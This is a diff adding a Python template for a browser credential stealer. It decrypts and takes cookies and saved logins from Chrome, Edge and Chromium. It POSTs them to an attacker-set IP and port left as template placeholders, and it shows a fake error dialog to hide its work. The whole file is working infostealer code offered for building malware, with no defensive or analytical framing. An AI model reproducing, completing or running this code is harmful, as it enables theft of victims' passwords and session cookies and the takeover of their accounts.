@@ -1,0 +1,63 @@
+import requests
+import ctypes
+import time
+import socket
+from _modules import steal
+from base64 import b64encode
+error = <<ERROR_BOOL>>
+error_message = """<<ERROR_MESSAGE>>"""
+cookies_bool = <<COOKIES_BOOL>>
+login_bool = <<LOGIN_BOOL>>
+
+
+def send_data(url, filename, data):
+    post_data = {
+        "filename": filename,
+        "data": data
+    }
+    requests.post(url, json=post_data)
+
+
+def send_error(sent):
+    if error and not sent:
+        ctypes.windll.user32.MessageBoxW(0, error_message, "Error", 0x10)
+
+
+def send_robber(login_directory, cookie_directory, encryption_key):
+    if cookies_bool:
+        cookies = steal.get_cookies(cookie_directory, encryption_key)
+        send_data(url, "cookies", cookies)
+    if login_bool:
+        logins = steal.get_logins(login_directory, encryption_key)
+        send_data(url, "logins", logins)
+
+
+if __name__ == "__main__":
+    sent = False
+    while True:
+        try:
+            ip_address = socket.gethostbyname("<<IP_ADDRESS>>")
+            port = <<PORT>>
+            url = f"http://{ip_address}:{port}"
+
+            if steal.chrome_exists():
+                key_directory, cookie_directory, login_directory = steal.get_chrome_directories()
+                encryption_key = steal.get_encryption_key(key_directory)
+                send_robber(login_directory, cookie_directory, encryption_key)
+            if steal.edge_exists():
+                key_directory, cookie_directory, login_directory = steal.get_edge_directories()
+                encryption_key = steal.get_encryption_key(key_directory)
+                send_robber(login_directory, cookie_directory, encryption_key)
+            if steal.chromnium_exists():
+                key_directory, cookie_directory, login_directory = steal.get_chromium_directories()
+                encryption_key = steal.get_encryption_key(key_directory)
+                send_robber(login_directory, cookie_directory, encryption_key)
+
+            send_error(sent)
+            break
+        except FileNotFoundError:
+            break
+        except:
+            send_error(sent)
+            sent = True
+            time.sleep(10)
